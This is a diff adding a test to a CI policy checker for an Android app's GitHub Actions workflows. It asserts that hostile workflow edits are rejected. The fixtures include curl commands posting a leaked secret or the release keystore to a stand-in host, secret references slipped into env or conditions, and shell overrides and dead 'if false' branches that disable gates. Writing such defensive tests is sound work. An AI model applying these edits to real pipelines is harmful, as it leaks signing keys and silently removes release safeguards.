@@ -416,7 +416,7 @@ test('only release.yml sign may use the release environment or read a secret', a
   for (const [name, file, text] of cases) {
     const findings = checkWorkflow(text, { file });
     assert.ok(
-      findings.some((finding) => /must not use the release environment|must not read secrets/.test(finding)),
+      findings.some((finding) => /must not declare environment|must not read secrets/.test(finding)),
       `${name}: ${findings.join(' | ')}`
     );
     assert.notEqual(await runPolicy(t, { ...files, [file]: text }), 0, `${name}: the CLI exits nonzero`);
@@ -427,6 +427,254 @@ test('only release.yml sign may use the release environment or read a secret', a
   assert.equal(sign.environment, 'release');
   assert.match(JSON.stringify(sign), /secrets\.ANDROID_KEYSTORE_BASE64/);
   assert.equal(await runPolicy(t, files), 0, 'the real tree is the positive control');
+});
+
+test('a merged workflow edit cannot grant the release key, hide a gate, or weaken the attestation', async (t) => {
+  const files = await real();
+  const checks = files['checks.yml'];
+  const release = files[RELEASE_FILE];
+  const cases = [
+    // F2-1: any job other than `sign` with any environment spelling, and any
+    // secret reference the old dotted-only scan missed.
+    [
+      'web environment expression',
+      'checks.yml',
+      checks.replace('  web:\n', "  web:\n    environment:\n      name: ${{ github.ref == 'refs/heads/main' && 'release' || 'none' }}\n"),
+      /must not declare environment/,
+    ],
+    [
+      'web environment map',
+      'checks.yml',
+      checks.replace('  web:\n', '  web:\n    environment:\n      name: release\n'),
+      /must not declare environment/,
+    ],
+    [
+      'workflow env secret',
+      'checks.yml',
+      checks.replace('permissions:\n', 'env:\n  LEAK: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}\npermissions:\n'),
+      /workflow env must not read secrets/,
+    ],
+    [
+      'secret in a step condition',
+      'checks.yml',
+      checks.replace(
+        '      - name: Privacy gate\n        run: npm run privacy:check',
+        "      - name: Privacy gate\n        if: ${{ secrets.ANDROID_KEYSTORE_PASSWORD != '' }}\n        run: npm run privacy:check"
+      ),
+      /must not read secrets/,
+    ],
+    [
+      'secret index in build env',
+      RELEASE_FILE,
+      release.replace(
+        "      ANDROID_BUILD_TOOLS: '36.0.0'\n",
+        "      ANDROID_BUILD_TOOLS: '36.0.0'\n      EXFIL: ${{ secrets[format('{0}', 'ANDROID_KEYSTORE_BASE64')] }}\n"
+      ),
+      /must not read secrets/,
+    ],
+    [
+      'extra web step',
+      'checks.yml',
+      checks.replace(
+        '      - name: Install the one dev-only dependency\n        run: npm ci\n',
+        '      - name: Diagnostics\n        run: curl -fsS -X POST --data-binary "$LEAK" https://evil.invalid/upload || true\n      - name: Install the one dev-only dependency\n        run: npm ci\n'
+      ),
+      /must have exactly/,
+    ],
+    [
+      'extra browser step',
+      'checks.yml',
+      checks.replace(
+        '      - name: Measured layout suites',
+        '      - name: Extra\n        run: echo extra\n      - name: Measured layout suites'
+      ),
+      /must have exactly/,
+    ],
+    // F2-2: job-level defaults/container/services/working-directory.
+    [
+      'web job defaults shell',
+      'checks.yml',
+      checks.replace('  web:\n', "  web:\n    defaults:\n      run:\n        shell: 'bash -c \"exit 0\" {0}'\n"),
+      /must not declare defaults/,
+    ],
+    [
+      'web job defaults working-directory',
+      'checks.yml',
+      checks.replace('  web:\n', '  web:\n    defaults:\n      run:\n        working-directory: test\n'),
+      /must not declare defaults/,
+    ],
+    ['web job container', 'checks.yml', checks.replace('  web:\n', '  web:\n    container: node:22\n'), /must not declare container/],
+    [
+      'web job services',
+      'checks.yml',
+      checks.replace('  web:\n', '  web:\n    services:\n      helper:\n        image: ghcr.io/attacker/helper:latest\n'),
+      /must not declare services/,
+    ],
+    [
+      'browser and android defaults',
+      'checks.yml',
+      checks
+        .replace('  browser:\n', "  browser:\n    defaults:\n      run:\n        shell: 'bash -c \"exit 0\" {0}'\n")
+        .replace('  android:\n', "  android:\n    defaults:\n      run:\n        shell: 'bash -c \"exit 0\" {0}'\n"),
+      /must not declare defaults/,
+    ],
+    // F4: npm config and shell environment cannot no-op a gate.
+    [
+      'step npm_config_script_shell',
+      'checks.yml',
+      checks.replace(
+        '      - name: Unit test suite (the browser suites have their own job)\n        run: npm run test:unit',
+        '      - name: Unit test suite (the browser suites have their own job)\n        env:\n          npm_config_script_shell: /bin/true\n        run: npm run test:unit'
+      ),
+      /must not set npm_config_script_shell/,
+    ],
+    [
+      'step uppercase NPM_CONFIG_SCRIPT_SHELL',
+      'checks.yml',
+      checks.replace(
+        '      - name: Unit test suite (the browser suites have their own job)\n        run: npm run test:unit',
+        '      - name: Unit test suite (the browser suites have their own job)\n        env:\n          NPM_CONFIG_SCRIPT_SHELL: /bin/true\n        run: npm run test:unit'
+      ),
+      /must not set NPM_CONFIG_SCRIPT_SHELL/,
+    ],
+    [
+      'job HOME',
+      'checks.yml',
+      checks.replace('  browser:\n', '  browser:\n    env:\n      HOME: /tmp/evil\n'),
+      /must not set HOME/,
+    ],
+    [
+      'workflow SHELL',
+      'checks.yml',
+      checks.replace('permissions:\n', 'env:\n  SHELL: /bin/true\npermissions:\n'),
+      /workflow env must not set SHELL/,
+    ],
+    [
+      'workflow IFS',
+      'checks.yml',
+      checks.replace('permissions:\n', "env:\n  IFS: ','\npermissions:\n"),
+      /workflow env must not set IFS/,
+    ],
+    // F2-3/F2-4/F6: the bundle is verified and the signed subject is pinned.
+    [
+      'bundle selected with find',
+      RELEASE_FILE,
+      release.replace(
+        '          shopt -s nullglob\n',
+        '          bundle="$(find . -maxdepth 1 -type f -name \'sha256*.jsonl\' -print -quit)"\n          shopt -s nullglob\n'
+      ),
+      /must not select the bundle with find/,
+    ],
+    [
+      'bundle signature check removed',
+      RELEASE_FILE,
+      release.replace('          gh attestation verify "$apk" \\\n', ''),
+      /must verify the bundle signature/,
+    ],
+    [
+      'bundle glob over dist',
+      RELEASE_FILE,
+      release.replace('          files=(dist/attest/*.jsonl)\n', '          files=(dist/*.jsonl)\n'),
+      /must download the bundle into the dedicated dist\/attest directory/,
+    ],
+    [
+      'attestation subject swapped to notes',
+      RELEASE_FILE,
+      release.replace(
+        '          subject-path: dist/drypoint-${{ needs.resolve.outputs.version }}.apk\n',
+        '          subject-path: dist/notes.md\n'
+      ),
+      /must attest dist\/drypoint/,
+    ],
+    [
+      'attestation digest swapped to notes',
+      RELEASE_FILE,
+      release.replace(
+        '          apk_sha="$(sha256sum "dist/drypoint-${VERSION}.apk" | awk \'{print $1}\')"',
+        '          apk_sha="$(sha256sum "dist/notes.md" | awk \'{print $1}\')"'
+      ),
+      /must hash the signed APK itself|run: must be the exact body/,
+    ],
+    [
+      'sign step extra command',
+      RELEASE_FILE,
+      release.replace(
+        '          ( cd dist && sha256sum -c "drypoint-${VERSION}-unsigned.apk.sha256" )\n',
+        '          ( cd dist && sha256sum -c "drypoint-${VERSION}-unsigned.apk.sha256" )\n          curl -fsS -X POST --data-binary @"$RUNNER_TEMP/release.jks" https://evil.invalid/upload || true\n'
+      ),
+      /run: must be the exact body/,
+    ],
+    [
+      'every attested statement required',
+      RELEASE_FILE,
+      release.replace('              and any($statements[];', '              and all($statements[];'),
+      /must not require every statement/,
+    ],
+    // F3/F7: a dead branch around a guard is a body change.
+    [
+      'resolve ancestry guard dead',
+      RELEASE_FILE,
+      release.replace(
+        '            tag="${tags[0]}"\n            if ! git merge-base --is-ancestor "$sha" origin/main; then\n              echo "::error::$sha is not an ancestor of origin/main"\n              exit 1\n            fi\n',
+        '            tag="${tags[0]}"\n            if false; then\n              if ! git merge-base --is-ancestor "$sha" origin/main; then\n                echo "::error::$sha is not an ancestor of origin/main"\n                exit 1\n              fi\n            fi\n'
+      ),
+      /run: must be the exact body/,
+    ],
+    [
+      'resolve version guard dead',
+      RELEASE_FILE,
+      release.replace(
+        '            version="$(git show "$tag:package.json" | jq -r .version)"\n            if [ "$version" != "${tag#v}" ]; then\n',
+        '            version="$(git show "$tag:package.json" | jq -r .version)"\n            if false; then\n            if [ "$version" != "${tag#v}" ]; then\n'
+      ),
+      /run: must be the exact body/,
+    ],
+    [
+      'publish byte comparison dead',
+      RELEASE_FILE,
+      release.replace(
+        '              if ! cmp -s "dist/${asset}" "$RUNNER_TEMP/existing/${asset}"; then\n',
+        '              if false; then\n              if ! cmp -s "dist/${asset}" "$RUNNER_TEMP/existing/${asset}"; then\n'
+      ),
+      /run: must be the exact body/,
+    ],
+    // R8-F2: the bundle is not reproducible, so it is verified, not compared.
+    [
+      'bundle byte comparison restored',
+      RELEASE_FILE,
+      release.replace(
+        '              "drypoint-${VERSION}.apk.sha256"; do',
+        '              "drypoint-${VERSION}.apk.sha256" \\\n              "drypoint-${VERSION}.apk.intoto.jsonl"; do'
+      ),
+      /run: must be the exact body/,
+    ],
+    [
+      'existing bundle not verified',
+      RELEASE_FILE,
+      release.replace('            gh attestation verify "$existing_apk" \\\n', ''),
+      /must verify the existing bundle signature|run: must be the exact body/,
+    ],
+    [
+      'publish SHA removed',
+      RELEASE_FILE,
+      release.replace(
+        '      SHA: ${{ needs.resolve.outputs.sha }}\n    steps:\n      - name: Download the release files',
+        '    steps:\n      - name: Download the release files'
+      ),
+      /env SHA must be exactly/,
+    ],
+  ];
+  for (const [name, file, text, pattern] of cases) {
+    assert.notEqual(text, file === 'checks.yml' ? checks : release, `${name}: the mutation applies`);
+    const findings = checkWorkflow(text, { file });
+    const releaseFindings = file === RELEASE_FILE ? checkReleaseWorkflow(text, { file }) : [];
+    assert.ok(
+      [...findings, ...releaseFindings].some((finding) => pattern.test(finding)),
+      `${name}: ${[...findings, ...releaseFindings].join(' | ')}`
+    );
+    assert.notEqual(await runPolicy(t, { ...files, [file]: text }), 0, `${name}: the CLI exits nonzero`);
+  }
+  assert.equal(await runPolicy(t, files), 0, 'the real tree passes');
 });
 
 test('the trusted jobs run no local action and the owned workflow set is closed', async (t) => {
